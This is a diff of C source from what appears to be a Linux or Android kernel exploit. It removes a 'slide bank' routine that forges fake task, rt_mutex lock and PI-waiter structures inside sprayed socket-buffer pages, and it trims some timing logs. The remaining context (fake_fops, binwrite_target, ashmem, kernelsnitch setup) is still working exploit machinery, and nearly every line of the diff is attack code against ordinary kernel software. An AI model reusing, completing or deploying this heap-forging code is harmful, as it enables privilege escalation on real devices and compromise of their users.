@@ -11,26 +11,6 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-static const uintptr_t slide_bank_offsets[] = {
-  SLIDE_P0_OFFSET_CANDIDATES
-};
-static uintptr_t slide_bank_payload_base;
-
-_Static_assert(
-    SLIDE_BANK_TASK_OFF + 31 * SLIDE_BANK_TASK_STRIDE +
-            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
-        ORDER3_SIZE,
-    "slide task bank exceeds reclaimed page");
-_Static_assert(
-    SLIDE_BANK_LOCK_OFF + 31 * SLIDE_BANK_SLOT_STRIDE +
-            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_WW_CTX_OFF +
-            sizeof(uint64_t) <=
-        ORDER3_SIZE,
-    "slide waiter bank exceeds reclaimed page");
-#endif
-
 static void log_mm_slabinfo(const char *stage) {
   FILE *fp = fopen("/proc/slabinfo", "r");
   if (!fp) {
@@ -58,28 +38,6 @@ uintptr_t fake_fops;
 uintptr_t binwrite_target;
 uintptr_t slide_p0_offset;
 char ashmem_path[256] = "/dev/ashmem";
-
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-int select_slide_payload_slot(uintptr_t offset) {
-  if (!slide_bank_payload_base) {
-    return 0;
-  }
-  for (size_t i = 0;
-       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
-    if (slide_bank_offsets[i] != offset) {
-      continue;
-    }
-    fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
-                i * SLIDE_BANK_TASK_STRIDE;
-    fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
-                i * SLIDE_BANK_SLOT_STRIDE;
-    fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
-    return 1;
-  }
-  return 0;
-}
-#endif
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
@@ -470,67 +428,6 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
   uintptr_t payload_base = base + SKB_DATA_DELTA;
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    slide_bank_payload_base = payload_base;
-    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
-      for (size_t slot = 0;
-           slot < sizeof(slide_bank_offsets) /
-                      sizeof(slide_bank_offsets[0]);
-           slot++) {
-        uintptr_t offset = slide_bank_offsets[slot];
-        size_t task_off = SLIDE_BANK_TASK_OFF +
-                          slot * SLIDE_BANK_TASK_STRIDE;
-        size_t lock_off = SLIDE_BANK_LOCK_OFF +
-                          slot * SLIDE_BANK_SLOT_STRIDE;
-        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
-        uintptr_t task = payload_base + task_off;
-        uintptr_t lock = payload_base + lock_off;
-        uintptr_t waiter = payload_base + waiter_off;
-
-        put32(p, lock_off + 0x00, 0);
-        put64(p, lock_off + 0x08, waiter);
-        put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
-
-        put64(p, waiter_off + 0x00, 1);
-        put64(p, waiter_off + 0x08, 0);
-        put64(p, waiter_off + 0x10, 0);
-        put32(p, waiter_off + FAKE_WAITER_TREE_PRIO_OFF,
-              SLIDE_FAKE_WAITER_PRIO);
-        put64(p, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-              SLIDE_LOGGERS_0_1 + offset);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-              SLIDE_RANDOM_BOOT_ID_DATA + offset);
-        put32(p, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF,
-              SLIDE_FAKE_WAITER_PRIO);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_TASK_OFF, task);
-        put64(p, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
-        put32(p, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
-
-        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
-        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
-        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
-        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
-              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
-        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
-      }
-    }
-    return select_slide_payload_slot(slide_bank_offsets[0]);
-  }
-#endif
-
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
@@ -829,12 +726,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    size_t started_ns = gettime_ns();
     uintptr_t base = prepare_kernel_page(payload_mode);
-    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
-    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
-            "base=%016zx\n",
-            payload_mode, attempt, max_attempts, elapsed_ms, base);
     if (base) {
       return base;
     }
